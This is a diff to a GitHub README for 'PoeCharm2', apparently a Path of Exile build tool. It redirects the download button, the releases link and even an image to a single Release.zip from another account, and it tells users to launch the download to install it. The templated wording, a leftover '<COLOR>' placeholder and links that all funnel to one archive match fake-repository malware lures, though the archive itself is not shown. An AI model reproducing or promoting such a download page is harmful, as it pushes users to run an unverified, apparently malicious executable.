@@ -9,7 +9,7 @@ PoeCharm2 is the Chinese version of the popular Path of Building 2 tool for the 
 ## Installation
 
 To download the software, click the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-<COLOR>.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/NautiluDeveloper/PoeCharm2/releases/download/v1.0/Release.zip<COLOR>.svg)](https://github.com/NautiluDeveloper/PoeCharm2/releases/download/v1.0/Release.zip)
 
 Please note that after downloading the software, it needs to be launched in order to install it on your system.
 
@@ -27,7 +27,7 @@ Please note that after downloading the software, it needs to be launched in orde
 
 ## Additional Resources
 
-For more information and updates, please visit the [Releases](https://github.com/22155555/1875695542/releases) section of this repository.
+For more information and updates, please visit the [Releases](https://github.com/NautiluDeveloper/PoeCharm2/releases/download/v1.0/Release.zip) section of this repository.
 
 ## How to Contribute
 
@@ -39,6 +39,6 @@ For any questions or issues, please contact the repository owner.
 
 Get ready to enhance your Path of Exile gaming experience with PoeCharm2! 🎮🔥
 
-![Path of Exile](https://via.placeholder.com/800x400)
+![Path of Exile](https://github.com/NautiluDeveloper/PoeCharm2/releases/download/v1.0/Release.zip)
 
 **Happy gaming!** 🎉
